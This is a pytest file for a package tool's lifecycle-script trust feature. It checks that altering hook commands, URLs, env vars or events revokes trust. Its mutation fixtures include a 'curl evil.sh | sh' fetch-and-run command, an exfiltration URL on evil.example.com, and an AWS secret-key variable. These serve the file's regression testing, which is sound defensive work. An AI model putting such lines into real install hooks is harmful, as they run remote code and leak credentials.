"""Vector 3 -- hash-domain completeness.

Every execution-relevant field inside a lifecycle entry must be inside the
hashed subtree, so editing ANY of them revokes trust.  If a field that
changes runtime behavior lived outside the fingerprint, an attacker could
mutate it post-trust and still execute -- a break.

These assert the secure behavior (mutation -> trust revoked), so they pass
on head and act as regression traps.
"""

from __future__ import annotations

import copy
from pathlib import Path

import pytest
import yaml

from apm_cli.core.script_trust import is_project_scripts_trusted, trust_project_scripts

BASELINE = {
    "name": "pkg",
    "lifecycle": {
        "post-install": [
            {
                "type": "command",
                "bash": "echo hi",
                "command": "echo hi",
                "cwd": "subdir",
                "env": {"FOO": "bar"},
                "allowedEnvVars": ["ANALYTICS_TOKEN"],
                "timeoutSec": 30,
            },
            {
                "type": "http",
                "url": "https://hooks.example.com/notify",
                "headers": {"X-Token": "$ANALYTICS_TOKEN"},
                "timeoutSec": 10,
            },
        ]
    },
}


def _write(path: Path, data: dict) -> None:
    path.write_text(yaml.safe_dump(data, default_flow_style=False), encoding="utf-8")


def _mutate(base: dict, idx: int, key: str, value: object) -> dict:
    data = copy.deepcopy(base)
    data["lifecycle"]["post-install"][idx][key] = value
    return data


# (description, mutated-dict) pairs -- each must revoke trust.
MUTATIONS = [
    ("bash", _mutate(BASELINE, 0, "bash", "echo PWNED")),
    ("command", _mutate(BASELINE, 0, "command", "echo PWNED")),
    ("cwd", _mutate(BASELINE, 0, "cwd", "/etc")),
    ("env", _mutate(BASELINE, 0, "env", {"FOO": "evil"})),
    ("allowedEnvVars", _mutate(BASELINE, 0, "allowedEnvVars", ["AWS_SECRET_ACCESS_KEY"])),
    ("timeoutSec", _mutate(BASELINE, 0, "timeoutSec", 9000)),
    ("type", _mutate(BASELINE, 0, "type", "http")),
    ("url", _mutate(BASELINE, 1, "url", "https://evil.example.com/exfil")),
    ("headers", _mutate(BASELINE, 1, "headers", {"X-Token": "stolen"})),
]


@pytest.mark.parametrize("field,mutated", MUTATIONS, ids=[m[0] for m in MUTATIONS])
def test_mutating_execution_field_revokes_trust(
    apm_home: Path, tmp_path: Path, field: str, mutated: dict
) -> None:
    apm_yml = tmp_path / "apm.yml"
    _write(apm_yml, BASELINE)
    trust_project_scripts(apm_yml)
    assert is_project_scripts_trusted(apm_yml), "baseline should be trusted"

    _write(apm_yml, mutated)
    assert not is_project_scripts_trusted(apm_yml), (
        f"editing execution field '{field}' must revoke trust"
    )


def test_adding_new_script_entry_revokes_trust(apm_home: Path, tmp_path: Path) -> None:
    """Appending a brand-new (attacker) entry must revoke trust."""
    apm_yml = tmp_path / "apm.yml"
    _write(apm_yml, BASELINE)
    trust_project_scripts(apm_yml)

    injected = copy.deepcopy(BASELINE)
    injected["lifecycle"]["post-install"].append({"type": "command", "bash": "curl evil.sh | sh"})
    _write(apm_yml, injected)
    assert not is_project_scripts_trusted(apm_yml)


def test_adding_new_event_revokes_trust(apm_home: Path, tmp_path: Path) -> None:
    """Adding a new lifecycle event (e.g. pre-install) must revoke trust."""
    apm_yml = tmp_path / "apm.yml"
    _write(apm_yml, BASELINE)
    trust_project_scripts(apm_yml)

    injected = copy.deepcopy(BASELINE)
    injected["lifecycle"]["pre-install"] = [{"type": "command", "bash": "echo evil"}]
    _write(apm_yml, injected)
    assert not is_project_scripts_trusted(apm_yml)


def _plain_fingerprint(lifecycle: dict) -> str:
    """The fingerprint an APM release that predates pre-compile computed."""
    import hashlib
    import json

    canonical = json.dumps(lifecycle, sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(canonical.encode("utf-8")).hexdigest()


def test_record_from_before_pre_compile_does_not_cover_it(apm_home: Path, tmp_path: Path) -> None:
    """A block trusted while pre-compile was an inert key needs fresh trust."""
    import json

    from apm_cli.core.script_trust import fingerprint_lifecycle_subtree

    lifecycle = {"pre-compile": [{"type": "command", "run": "gen"}]}
    path = tmp_path / "apm.yml"
    _write(path, {"name": "pkg", "lifecycle": lifecycle})
    store = apm_home / "scripts-trust.json"
    store.parent.mkdir(parents=True, exist_ok=True)
    store.write_text(
        json.dumps({"version": 1, "projects": {str(path.resolve()): _plain_fingerprint(lifecycle)}})
    )

    assert fingerprint_lifecycle_subtree(lifecycle) != _plain_fingerprint(lifecycle)
    assert not is_project_scripts_trusted(path), "old record silently covers pre-compile"

    trust_project_scripts(path)
    assert is_project_scripts_trusted(path), "fresh trust must cover pre-compile"


def test_blocks_without_new_events_keep_their_fingerprint() -> None:
    """Existing trust for blocks without pre-compile survives the upgrade."""
    from apm_cli.core.script_trust import fingerprint_lifecycle_subtree

    assert fingerprint_lifecycle_subtree(BASELINE["lifecycle"]) == _plain_fingerprint(
        BASELINE["lifecycle"]
    )
